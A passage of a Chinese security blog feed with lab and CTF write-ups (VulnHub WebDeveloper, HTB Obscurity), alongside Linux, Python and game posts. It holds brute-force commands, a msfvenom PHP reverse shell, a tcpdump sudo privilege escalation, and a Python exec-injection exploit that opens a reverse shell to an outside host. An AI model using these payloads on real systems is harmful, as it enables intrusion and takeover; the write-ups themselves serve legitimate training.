alt></p><p>另外一种方式提权</p><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p><p>查找SUID用户运行的程序<br><img src="/posts/fcea4f6a/1576581556847.png" alt></p><p>发现a.out</p><p><img src="/posts/fcea4f6a/1576581569529.png" alt><br>猜测其运行的是whoami命令</p><p>通过环境变量提权<br><img src="/posts/fcea4f6a/1576581656579.png" alt></p><p>同样拿到flag<br><img src="/posts/fcea4f6a/1576581679658.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一个Linux命令-kill</title>
      <link href="/posts/da023d5c/"/>
      <url>/posts/da023d5c/</url>
      
        <content type="html"><![CDATA[<h2 id="ps命令"><a href="#ps命令" class="headerlink" title="ps命令"></a>ps命令</h2><p>首先需要熟悉一下 ps 命令</p><p>一般通过 <code>ps aux | more</code> 查看到所有的进程</p><p><code>ps -e</code> 列出程序时，显示每个程序所使用的环境变量</p><p><code>ps u</code> 　 以用户为主的格式来显示程序状况。</p><p><code>ps -a</code>显示同一终端下的所有程序</p><p><code>ps a</code> 显示所有进程</p><h2 id="kill-命令"><a href="#kill-命令" class="headerlink" title="kill 命令"></a>kill 命令</h2>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> kill </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux命令trick</title>
      <link href="/posts/ebe7281d/"/>
      <url>/posts/ebe7281d/</url>
      
        <content type="html"><![CDATA[<h2 id="常用的命令组合"><a href="#常用的命令组合" class="headerlink" title="常用的命令组合"></a>常用的命令组合</h2><p><strong>统计字符串长度</strong></p><pre><code class="bash">$ echo -n 12345 | wc -c5</code></pre><h2 id="搜索文件后门"><a href="#搜索文件后门" class="headerlink" title="搜索文件后门"></a>搜索文件后门</h2><pre><code class="bash"># 简单的查找后门find . -name &#39;*.php&#39; | xargs grep -n &#39;eval(&#39;find . -name &#39;*.php&#39; | xargs grep -n &#39;assert(&#39;find . -name &#39;*.php&#39; | xargs grep -n &#39;system(&#39;</code></pre><h2 id="数据库备份-mysqldump用法"><a href="#数据库备份-mysqldump用法" class="headerlink" title="数据库备份 mysqldump用法"></a>数据库备份 mysqldump用法</h2><pre><code class="bash">mysqldump -u db_user -p db_passwd db_name &gt; bak.sql//备份指定数据库mysqldump --all-databases &gt; bak.sql //备份所有数据库mysql -u db_user -p db_passwd db_name &lt; bak.sql //还原指定数据库//也可以登录到mysql之后再 source xxx.sql</code></pre><h2 id="mysql-修改密码"><a href="#mysql-修改密码" class="headerlink" title="mysql 修改密码"></a>mysql 修改密码</h2><pre><code>mysql&gt; set password for root@localhost = password(&#39;root&#39;);Query OK, 0 rows affected, 1 warning (0.00 sec)</code></pre><p>但是这条命令似乎不行</p><pre><code>update user set password=PASSWORD(&#39;NEW PASSWORD&#39;) where user=&#39;root&#39;;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶机渗透-WebDeveloper</title>
      <link href="/posts/4d0603d0/"/>
      <url>/posts/4d0603d0/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>扫描端口发现是 80 和 22开放了，其中80运行着wordpress服务</p><p>使用 <code>wpscan</code> 扫描用户和插件</p><pre><code>wpscan --url http://192.168.99.100/ -e u,p </code></pre><p>发现了用户 <code>webdeveloper</code></p><p>之后自然是尝试爆破密码了，使用 <code>wpscan</code> 和 <code>hydra</code> 同时爆破</p><pre><code>wpscan --url http://192.168.99.100/ -U webdeveloper  -P ./rockyou.txthydra -l webdeveloper -P rockyou.txt  -t 10 192.168.99.100 http-post-form &quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^:login_error&quot;</code></pre><p>但是经过很长时间后并没有爆破出来，神器 <code>xray</code> 扫描也为探测到相关信息</p><p>也尝试使用了 <code>dirsearch.py</code> ，但是依旧无果</p><p>换用了 <code>dirb</code></p><pre><code>GENERATED WORDS: 4613                                                          ---- Scanning URL: http://192.168.99.100/ ----+ http://192.168.99.100/index.php (CODE:301|SIZE:0)                                                                                                         ==&gt; DIRECTORY: http://192.168.99.100/ipdata/   !!!                                                                                                             + http://192.168.99.100/server-status (CODE:403|SIZE:302)                                                                                                   ==&gt; DIRECTORY: http://192.168.99.100/wp-admin/                                                                                                              ==&gt; DIRECTORY: http://192.168.99.100/wp-content/                                                                                                            ==&gt; DIRECTORY: http://192.168.99.100/wp-includes/                                                                                                           + http://192.168.99.100/xmlrpc.php (CODE:405|SIZE:42)       </code></pre><p>发现了 <code>ipdata/</code> 目录，访问之后是一个流量包</p><p>打开之后过滤</p><pre><code>http.request.method == &quot;POST&quot;</code></pre><p><img src="/posts/4d0603d0/1580996926610.png" alt></p><p>原来密码这么复杂。怪不得爆破不出来</p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>登录后台之后发现安装了两个插件，并且可以修改源代码，这时候就会想到用 <code>msfvenom</code> 生成php木马，然后反弹得到shell</p><pre><code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.99.1 lport=4444 -f raw -o shell.php</code></pre><p>修改一个插件的源码然后启用就能拿到shell了</p><p>然后查看 <code>wp-config.php</code></p><pre><code>// ** MySQL settings - You can get this info from your web host ** ///** The name of the database for WordPress */define(&#39;DB_NAME&#39;, &#39;wordpress&#39;);/** MySQL database username */define(&#39;DB_USER&#39;, &#39;webdeveloper&#39;);/** MySQL database password */define(&#39;DB_PASSWORD&#39;, &#39;MasterOfTheUniverse&#39;);/** MySQL hostname */define(&#39;DB_HOST&#39;, &#39;localhost&#39;);/** Database Charset to use in creating database tables. */define(&#39;DB_CHARSET&#39;, &#39;utf8mb4&#39;);/** The Database Collate type. Don&#39;t change this if in doubt. */define(&#39;DB_COLLATE&#39;, &#39;&#39;);</code></pre><p>获得了数据库的账号和密码，那就登陆一下数据库</p><p>但是在数据库中并没有获得很多信息</p><pre><code>mysql&gt; show tables;show tables;+-----------------------+| Tables_in_wordpress   |+-----------------------+| wp_commentmeta        || wp_comments           || wp_links              || wp_options            || wp_postmeta           || wp_posts              || wp_term_relationships || wp_term_taxonomy      || wp_termmeta           || wp_terms              || wp_usermeta           || wp_users              |+-----------------------+12 rows in set (0.00 sec</code></pre><p>尝试直接ssh登陆，居然可以！</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>登录之后 ， <code>sudo -l</code></p><pre><code class="bash">webdeveloper@webdeveloper:~$ sudo -l[sudo] password for webdeveloper:Matching Defaults entries for webdeveloper on webdeveloper:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser webdeveloper may run the following commands on webdeveloper:    (root) /usr/sbin/tcpdump</code></pre><p>那就可以用 <code>tcpdump</code> 提权了</p><pre><code class="bash">webdeveloper@webdeveloper:~$ touch /tmp/exploitwebdeveloper@webdeveloper:~$ echo &quot;cat /root/flag.txt&quot; &gt; /tmp/exploitwebdeveloper@webdeveloper:~$ chmod +x /tmp/exploitwebdeveloper@webdeveloper:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/exploit -Z root[sudo] password for webdeveloper:dropped privs to roottcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytesMaximum file limit reached: 11 packet captured710 packets received by filter0 packets dropped by kernelwebdeveloper@webdeveloper:~$ Congratulations here is youre flag:cba045a5a4f26f1cd8d7be9a5c2b1b34f6c5d290</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一个Linux命令-tcpdump</title>
      <link href="/posts/9cc474ce/"/>
      <url>/posts/9cc474ce/</url>
      
        <content type="html"><![CDATA[<h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><ul><li>-i 指定网卡接口</li><li>-c 指定数量</li><li>-w 保存的文件名</li><li>-z 指定脚本</li><li>-Z 指定用户</li></ul><h2 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h2><p>指定主机，截获所有210.27.48.1 的主机收到的和发出的所有的数据包</p><pre><code>tcpdump host 210.27.48.1 </code></pre><p>截获主机210.27.48.1 和主机210.27.48.2 或210.27.48.3的通信</p><pre><code>tcpdump host 210.27.48.1 and \ (210.27.48.2 or 210.27.48.3 \) </code></pre><p>截获主机hostname发送的所有数据</p><pre><code>tcpdump -i eth0 src host hostname</code></pre><p>监视所有送到主机的数据包</p><pre><code>tcpdump -i eth0 dst host hostname</code></pre><p>如果想要获取主机210.27.48.1接收或发出的telnet包，使用如下命令</p><pre><code>tcpdump tcp port 23 and host 210.27.48.1</code></pre><p>对本机的udp 123 端口进行监视 123 为ntp的服务端口</p><pre><code>tcpdump udp port 123 </code></pre><h2 id="使用tcpdump抓包，再用wireshark查看"><a href="#使用tcpdump抓包，再用wireshark查看" class="headerlink" title="使用tcpdump抓包，再用wireshark查看"></a>使用tcpdump抓包，再用wireshark查看</h2><pre><code>tcpdump tcp -i eth1 -t -s 0 -c 100 and dst port ! 22 and src net 192.168.1.0/24 -w ./target.cap</code></pre><p>抓取http包</p><pre><code>tcpdump  -XvvennSs 0 -i eth0 tcp[20:2]=0x4745 or tcp[20:2]=0x4854</code></pre><h2 id="tcpdump提权"><a href="#tcpdump提权" class="headerlink" title="tcpdump提权"></a>tcpdump提权</h2><p>遇到这种情况</p><pre><code class="bash">webdeveloper@webdeveloper:~$ sudo -l[sudo] password for webdeveloper:Matching Defaults entries for webdeveloper on webdeveloper:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser webdeveloper may run the following commands on webdeveloper:    (root) /usr/sbin/tcpdump</code></pre><p>可以用root身份执行tcpdump命令，其中 <code>/tmp/exploit</code> 是想要以root身份执行的脚本</p><pre><code>sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/exploit -Z root</code></pre><blockquote><p>-z 指定脚本，-Z 指定用户身份</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tcpdump </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何保护版权</title>
      <link href="/posts/3b32f749/"/>
      <url>/posts/3b32f749/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>冰气时代玩后感</title>
      <link href="/posts/69f21310/"/>
      <url>/posts/69f21310/</url>
      
        <content type="html"><![CDATA[<p>寒假正逢steam打折，一直放在愿望单中的冰气时代这会降价了，果断入坑</p><p>买来之后第一把就找不着北了，游戏的玩法还是比较简单，但是前期资源匮乏，我需要收集木炭和木材，我一开始并没有意识到，等我将木材耗尽之后发现没有地方可以收集木材了？？？周围倒是有一些冻树木，但是要建造伐木场才行，wtf???,这游戏难道就到头了？</p><p>之后去找了B站的教程，欸突然意识到原来黑乎乎的一团有些是煤堆，有些是木箱23333，采集木箱可以收集木材。哦这游戏居然可以这样玩啊。这还只是我遇到的第一个坑，后面还遇到了建房子要和道路相连，道路要和能量塔相连等等</p><p> 不过这个游戏设计的比较好的就是法律和不满值了，我一直很担心不满值会升高，但是有些法律又不得不的签署，比如童工，比如加班，如果不这样的话就导致资源收集的速度很慢，大部分时候收集到的煤炭一个晚上就耗完了。</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 游戏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python文件</title>
      <link href="/posts/75a61507/"/>
      <url>/posts/75a61507/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python3字符串</title>
      <link href="/posts/25e898cd/"/>
      <url>/posts/25e898cd/</url>
      
        <content type="html"><![CDATA[<h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><h3 id="性质判定"><a href="#性质判定" class="headerlink" title="性质判定"></a>性质判定</h3><pre><code>isalnum()、isalpha()、isdigit()、islower()、isupper()、isspace()、istitle()、startswith(prefix[,start[, end]])、endswith(suffix[,start[, end]])</code></pre><h3 id="查找和替换"><a href="#查找和替换" class="headerlink" title="查找和替换"></a>查找和替换</h3><pre><code>count( sub[, start[, end]])、find( sub[, start[,end]])、index( sub[, start[, end]])、rfind( sub[, start[,end]])、rindex(sub[, start[, end]])</code></pre><p>注意find()和index()方法的不同：find()函数族找不到时返回-1，index()函数族则抛出ValueError异常。</p><p>但是对于判定是否包含字串的判定推荐用  <code>in</code> 和 <code>not in</code>操作符</p><p><code>replace(old, new[,count])</code>用以替换字符串的某些子串，如果指定count参数的话，就最多替换count次，如果不指定，就全部替换</p><h3 id="分切和连接"><a href="#分切和连接" class="headerlink" title="分切和连接"></a>分切和连接</h3><p><code>partition()</code> 和 <code>split</code> </p><p>split举例</p><pre><code class="python">&gt;&gt;&gt; &#39; hello     world&#39;.split()[&#39;hello&#39;, &#39;world&#39;]&gt;&gt;&gt; &#39; hello     world&#39;.split(&#39; &#39;)  # 要注意第一种方式和第二种方式不一样[&#39;&#39;, &#39;hello&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;world&#39;]&gt;&gt;&gt; &#39; hello     world&#39;.split(&#39;&#39;)Traceback (most recent call last):  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;ValueError: empty separator&gt;&gt;&gt; &#39;&#39;.split()[]&gt;&gt;&gt; &#39;&#39;.split(&#39; &#39;)[&#39;&#39;]</code></pre><h3 id="变形"><a href="#变形" class="headerlink" title="变形"></a>变形</h3><pre><code>lower()、upper()、capitalize()、swapcase()、title()</code></pre><h3 id="删减与填充"><a href="#删减与填充" class="headerlink" title="删减与填充"></a>删减与填充</h3><pre><code>strip([chars])、lstrip([chars])、rstrip([chars])center(width[, fillchar])、ljust(width[,fillchar])、rjust(width[, fillchar])、zfill(width)、expandtabs([tabsize])</code></pre><p>这些方法中的fillchar参数是指用以填充的字符，默认是空格。而zfill()中的z是指zero，所以顾名思义，zfill()即是以字符0进行填充，在输出数值时比较常用。expandtabs()的tabsize参数默认为8，它的功能是把字符串中的制表符（tab）转换为适当数量的空格。</p><h2 id="f字符串"><a href="#f字符串" class="headerlink" title="f字符串"></a>f字符串</h2><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><pre><code class="python">In [2]: name = &quot;pxy&quot;In [3]: f&#39;Hello, my name is {name}&#39;Out[3]: &#39;Hello, my name is pxy&#39;</code></pre><p>求值运算</p><pre><code class="python">In [5]: &gt;&gt;&gt; f&#39;Complex number {(2 + 2j) / (2 - 3j)}&#39;Out[5]: &#39;Complex number (-0.15384615384615388+0.7692307692307692j)&#39;In [6]: import mathIn [7]: f&#39;The answer is {math.log(math.pi)}&#39;Out[7]: &#39;The answer is 1.1447298858494002</code></pre><p>f-string大括号内也可填入lambda表达式，但lambda表达式的 <code>:</code> 会被f-string误认为是表达式与格式描述符之间的分隔符，为避免歧义，需要将lambda表达式置于括号 <code>()</code> 内：</p><pre><code class="python">In [1]: f&#39;result is {(lambda x: x ** 2 + 1) (2)}&#39;Out[1]: &#39;result is 5&#39;</code></pre><h2 id="bytes"><a href="#bytes" class="headerlink" title="bytes"></a>bytes</h2><h3 id="str转bytes"><a href="#str转bytes" class="headerlink" title="str转bytes"></a>str转bytes</h3><pre><code class="python">In [23]: bytes(a, encoding=&quot;gbk&quot;)Out[23]: b&#39;\xb0\xd9\xb6\xc8&#39;In [24]: bytes(a, encoding=&quot;utf-8&quot;)Out[24]: b&#39;\xe7\x99\xbe\xe5\xba\xa6&#39;</code></pre><h3 id="从十六进制转化为bytes"><a href="#从十六进制转化为bytes" class="headerlink" title="从十六进制转化为bytes"></a>从十六进制转化为bytes</h3><pre><code class="python">In [39]: a = &#39;aabbccddeeff&#39;In [40]: a_bytes = bytes.fromhex(a)In [41]: a_bytesOut[41]: b&#39;\xaa\xbb\xcc\xdd\xee\xff&#39;</code></pre><h3 id="从bytes转化为十六进制"><a href="#从bytes转化为十六进制" class="headerlink" title="从bytes转化为十六进制"></a>从bytes转化为十六进制</h3><pre><code class="python">In [42]: a_bytesOut[42]: b&#39;\xaa\xbb\xcc\xdd\xee\xff&#39;In [43]: a_bytes.hex()Out[43]: &#39;aabbccddeeff&#39;</code></pre><h3 id="base64编码byets"><a href="#base64编码byets" class="headerlink" title="base64编码byets"></a>base64编码byets</h3><p>python3的base64包的 <code>b64encode</code> 只能使用 bytes 类型</p><pre><code class="python"># 比如我们要编码 \xac\xedIn [54]: a = &quot;aced&quot;In [55]: a = bytes.fromhex(a)In [56]: aOut[56]: b&#39;\xac\xed&#39;In [57]: base64.b64encode(a)Out[57]: b&#39;rO0=&#39;</code></pre><h3 id="md5加密bytes"><a href="#md5加密bytes" class="headerlink" title="md5加密bytes"></a>md5加密bytes</h3><p>python3 只能用hashlib中的md5函数</p><pre><code class="python">a = hashlib.md5()a.update(b&quot;pxy&quot;)a.hexdigest()</code></pre><p>封装一下</p><pre><code class="python"># 生成MD5def genearteMD5(str):    # 创建md5对象    hl = hashlib.md5()    # Tips    # 此处必须声明encode    # 否则报错为：hl.update(str)    Unicode-objects must be encoded before hashing    hl.update(str.encode(encoding=&#39;utf-8&#39;))    print(&#39;MD5加密前为 ：&#39; + str)    print(&#39;MD5加密后为 ：&#39; + hl.hexdigest())</code></pre><h2 id="一些小技巧"><a href="#一些小技巧" class="headerlink" title="一些小技巧"></a>一些小技巧</h2><h3 id="判断字符串是否为空"><a href="#判断字符串是否为空" class="headerlink" title="判断字符串是否为空"></a>判断字符串是否为空</h3><p>用 <code>a == None</code> 是不行的</p><p>可以这样</p><pre><code class="python">a = &quot;&quot;if a.strip() == &quot;&quot;:    print(&quot;a is null&quot;)</code></pre><h3 id="list和str转换"><a href="#list和str转换" class="headerlink" title="list和str转换"></a>list和str转换</h3><pre><code class="python">In [17]: a = &quot;aaaafasfasd&quot;In [18]: list(a)Out[18]: [&#39;a&#39;, &#39;a&#39;, &#39;a&#39;, &#39;a&#39;, &#39;f&#39;, &#39;a&#39;, &#39;s&#39;, &#39;f&#39;, &#39;a&#39;, &#39;s&#39;, &#39;d&#39;]</code></pre><h3 id="固定长度分割字符串"><a href="#固定长度分割字符串" class="headerlink" title="固定长度分割字符串"></a>固定长度分割字符串</h3><p>传统上一般是遍历</p><pre><code class="python">def fix_width_split(string, width):    return [string[x : x + width] for x in range(0, len(string), width)]print fix_width_split(&#39;123456789&#39;, 3)</code></pre><p>但是如果有了正则，可以这样</p><pre><code class="python">import restring = &#39;123456789&#39;split = re.findall(r&#39;.{7}&#39;, string)</code></pre><p>结果</p><pre><code class="python">In [76]: string = &#39;123456789&#39;In [77]: split = re.findall(&quot;.{3}&quot;, string)In [78]: splitOut[78]: [&#39;123&#39;, &#39;456&#39;, &#39;789&#39;]</code></pre><h3 id="bytes写入文件"><a href="#bytes写入文件" class="headerlink" title="bytes写入文件"></a>bytes写入文件</h3><p>以二进制方式打开即可</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/sunxb10/article/details/81036693" target="_blank" rel="noopener">python格式化字符串f-string</a></p><p><a href="https://www.40huo.cn/blog/python-string-tricks.html" target="_blank" rel="noopener">python字符串trick</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 字符串 </tag>
            
            <tag> bytes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB Obscurity靶机实战</title>
      <link href="/posts/a0911a0b/"/>
      <url>/posts/a0911a0b/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>这里可以先设置一下hosts文件 </p><pre><code>10.10.10.168 obscure.htb</code></pre><p>扫描端口发现开放了 <code>8080</code> 的web端口</p><p>页面提示有一个源码泄露</p><pre><code>Message to server devs: the current source code for the web server is in &#39;SuperSecureServer.py&#39; in the secret development directory</code></pre><p>那我们就需要爆破目录了</p><p>使用 <code>wfuzz</code></p><pre><code class="bash">sudo wfuzz -c -z file,common.txt -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py</code></pre><p><img src="/posts/a0911a0b/1580912401299.png" alt></p><p>得到源码：</p><pre><code class="python">import socketimport threadingfrom datetime import datetimeimport sysimport osimport mimetypesimport urllib.parseimport subprocessrespTemplate = &quot;&quot;&quot;HTTP/1.1 {statusNum} {statusCode}Date: {dateSent}Server: {server}Last-Modified: {modified}Content-Length: {length}Content-Type: {contentType}Connection: {connectionType}{body}&quot;&quot;&quot;DOC_ROOT = &quot;DocRoot&quot;CODES = {&quot;200&quot;: &quot;OK&quot;,         &quot;304&quot;: &quot;NOT MODIFIED&quot;,        &quot;400&quot;: &quot;BAD REQUEST&quot;, &quot;401&quot;: &quot;UNAUTHORIZED&quot;, &quot;403&quot;: &quot;FORBIDDEN&quot;, &quot;404&quot;: &quot;NOT FOUND&quot;,         &quot;500&quot;: &quot;INTERNAL SERVER ERROR&quot;}MIMES = {&quot;txt&quot;: &quot;text/plain&quot;, &quot;css&quot;:&quot;text/css&quot;, &quot;html&quot;:&quot;text/html&quot;, &quot;png&quot;: &quot;image/png&quot;, &quot;jpg&quot;:&quot;image/jpg&quot;,         &quot;ttf&quot;:&quot;application/octet-stream&quot;,&quot;otf&quot;:&quot;application/octet-stream&quot;, &quot;woff&quot;:&quot;font/woff&quot;, &quot;woff2&quot;: &quot;font/woff2&quot;,         &quot;js&quot;:&quot;application/javascript&quot;,&quot;gz&quot;:&quot;application/zip&quot;, &quot;py&quot;:&quot;text/plain&quot;, &quot;map&quot;: &quot;application/octet-stream&quot;}class Response:    def __init__(self, **kwargs):        self.__dict__.update(kwargs)        now = datetime.now()        self.dateSent = self.modified = now.strftime(&quot;%a, %d %b %Y %H:%M:%S&quot;)    def stringResponse(self):        return respTemplate.format(**self.__dict__)class Request:    def __init__(self, request):        self.good = True        try:            request = self.parseRequest(request)            self.method = request[&quot;method&quot;]            self.doc = request[&quot;doc&quot;]            self.vers = request[&quot;vers&quot;]            self.header = request[&quot;header&quot;]            self.body = request[&quot;body&quot;]        except:            self.good = False    def parseRequest(self, request):                req = request.strip(&quot;\r&quot;).split(&quot;\n&quot;)        method,doc,vers = req[0].split(&quot; &quot;)        header = req[1:-3]        body = req[-1]        headerDict = {}        for param in header:            pos = param.find(&quot;: &quot;)            key, val = param[:pos], param[pos+2:]            headerDict.update({key: val})        return {&quot;method&quot;: method, &quot;doc&quot;: doc, &quot;vers&quot;: vers, &quot;header&quot;: headerDict, &quot;body&quot;: body}class Server:    def __init__(self, host, port):            self.host = host        self.port = port        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)        self.sock.bind((self.host, self.port))    def listen(self):        self.sock.listen(5)        while True:            client, address = self.sock.accept()            client.settimeout(60)            threading.Thread(target = self.listenToClient,args = (client,address)).start()    def listenToClient(self, client, address):        size = 1024        while True:            try:                data = client.recv(size) # 收到客户端的数据，应该就是数据包                if data:                    # Set the response to echo back the recieved data                     req = Request(data.decode()) # byte转str，返回的req是list                    self.handleRequest(req, client, address)                    client.shutdown()                    client.close()                else:                    raise error(&#39;Client disconnected&#39;)            except:                client.close()                return False    def handleRequest(self, request, conn, address):        if request.good:#            try:                # print(str(request.method) + &quot; &quot; + str(request.doc), end=&#39; &#39;)                # print(&quot;from {0}&quot;.format(address[0]))#            except Exception as e:#                print(e)            document = self.serveDoc(request.doc, DOC_ROOT)            statusNum=document[&quot;status&quot;]        else:            document = self.serveDoc(&quot;/errors/400.html&quot;, DOC_ROOT)            statusNum=&quot;400&quot;        body = document[&quot;body&quot;]        statusCode=CODES[statusNum]        dateSent = &quot;&quot;        server = &quot;BadHTTPServer&quot;        modified = &quot;&quot;        length = len(body)        contentType = document[&quot;mime&quot;] # Try and identify MIME type from string        connectionType = &quot;Closed&quot;        resp = Response(        statusNum=statusNum, statusCode=statusCode,         dateSent = dateSent, server = server,         modified = modified, length = length,         contentType = contentType, connectionType = connectionType,         body = body        )        data = resp.stringResponse()        if not data:            return -1        conn.send(data.encode())        return 0    def serveDoc(self, path, docRoot):        path = urllib.parse.unquote(path)        try:            info = &quot;output = &#39;Document: {}&#39;&quot; # Keep the output for later debug            exec(info.format(path)) # This is how you do string formatting, right?            cwd = os.path.dirname(os.path.realpath(__file__))            docRoot = os.path.join(cwd, docRoot)            if path == &quot;/&quot;:                path = &quot;/index.html&quot;            requested = os.path.join(docRoot, path[1:])            if os.path.isfile(requested):                mime = mimetypes.guess_type(requested)                mime = (mime if mime[0] != None else &quot;text/html&quot;)                mime = MIMES[requested.split(&quot;.&quot;)[-1]]                try:                    with open(requested, &quot;r&quot;) as f:                        data = f.read()                except:                    with open(requested, &quot;rb&quot;) as f:                        data = f.read()                status = &quot;200&quot;            else:                errorPage = os.path.join(docRoot, &quot;errors&quot;, &quot;404.html&quot;)                mime = &quot;text/html&quot;                with open(errorPage, &quot;r&quot;) as f:                    data = f.read().format(path)                status = &quot;404&quot;        except Exception as e:            print(e)            errorPage = os.path.join(docRoot, &quot;errors&quot;, &quot;500.html&quot;)            mime = &quot;text/html&quot;            with open(errorPage, &quot;r&quot;) as f:                data = f.read()            status = &quot;500&quot;        return {&quot;body&quot;: data, &quot;mime&quot;: mime, &quot;status&quot;: status}</code></pre><p>审计源码发现关键点：</p><pre><code class="python">def serveDoc(self, path, docRoot):    path = urllib.parse.unquote(path)    try:        info = &quot;output = &#39;Document: {}&#39;&quot; # Keep the output for later debug        exec(info.format(path)) # This is how you do string formatting, right?        cwd = os.path.dirname(os.path.realpath(__file__))        docRoot = os.path.join(cwd, docRoot)</code></pre><p>大致说一下代码的含义，开启socket监听，接收到http请求，调用 <code>Request</code> 类的 <code>parseRequest</code> 方法做分割，然后调用 <code>handleRequest</code> 处理请求，通过 <code>serveDoc</code> 处理请求的文档</p><p><code>exec</code> 函数处存在命令注入</p><pre><code class="python">In [33]: path = &quot;/&#39;;os.system(&#39;whoami&#39;)#&quot;In [34]: exec(info.format(path))laptop-ubiep4k5\zz</code></pre><p>然后就可以通过python反弹shell了</p><pre><code class="python">import requestsimport urllibimport osurl = &#39;http://10.10.10.168:8080/&#39;path=&#39;5\&#39;&#39;+&#39;\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.146&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])\na=\&#39;&#39;payload = urllib.parse.quote(path)print(&quot;payload&quot;)print(url+payload)r= requests.get(url+payload)print(r.headers)print(r.text)</code></pre><p>反弹到shell之后继续进行信息收集：</p><p><code>check.txt</code>，大致含义就是加密了这个文件，加密的结果是 <code>out.txt</code></p><pre><code class="bash">www-data@obscure:/home/robert$ cat check.txtcat check.txtEncrypting this file with your key should result in out.txt, make sure your key is correct!</code></pre><p><code>out.txt</code>, 这个就是加密的结果</p><pre><code>www-data@obscure:/home/robert$ xxd out.txtxxd out.txt00000000: c2a6 c39a c388 c3aa c39a c39e c398 c39b  ................00000010: c39d c39d c289 c397 c390 c38a c39f c285  ................00000020: c39e c38a c39a c389 c292 c3a6 c39f c39d  ................00000030: c38b c288 c39a c39b c39a c3aa c281 c399  ................00000040: c389 c3ab c28f c3a9 c391 c392 c39d c38d  ................00000050: c390 c285 c3aa c386 c3a1 c399 c39e c3a3  ................00000060: c296 c392 c391 c288 c390 c3a1 c399 c2a6  ................00000070: c395 c3a6 c398 c29e c28f c3a3 c38a c38e  ................00000080: c38d c281 c39f c39a c3aa c386 c28e c39d  ................00000090: c3a1 c3a4 c3a8 c289 c38e c38d c39a c28c  ................000000a0: c38e c3ab c281 c391 c393 c3a4 c3a1 c39b  ................000000b0: c38c c397 c289 c281 76                   ........v</code></pre><p><code>passwordreminder.txt</code> 又是一个加密后的文件</p><pre><code>www-data@obscure:/home/robert$ hd passwordreminder.txthd passwordreminder.txt00000000  c2 b4 c3 91 c3 88 c3 8c  c3 89 c3 a0 c3 99 c3 81  |................|00000010  c3 91 c3 a9 c2 af c2 b7  c2 bf 6b                 |..........k|0000001b</code></pre><p> <code>BetterSSH.py</code> (这个之后提权会用到)</p><pre><code class="python">www-data@obscure:/home/robert/BetterSSH$ cat BetterSSH.pycat BetterSSH.pyimport sysimport random, stringimport osimport timeimport cryptimport tracebackimport subprocesspath = &#39;&#39;.join(random.choices(string.ascii_letters + string.digits, k=8))session = {&quot;user&quot;: &quot;&quot;, &quot;authenticated&quot;: 0}try:    session[&#39;user&#39;] = input(&quot;Enter username: &quot;)    passW = input(&quot;Enter password: &quot;)    with open(&#39;/etc/shadow&#39;, &#39;r&#39;) as f:        data = f.readlines()    data = [(p.split(&quot;:&quot;) if 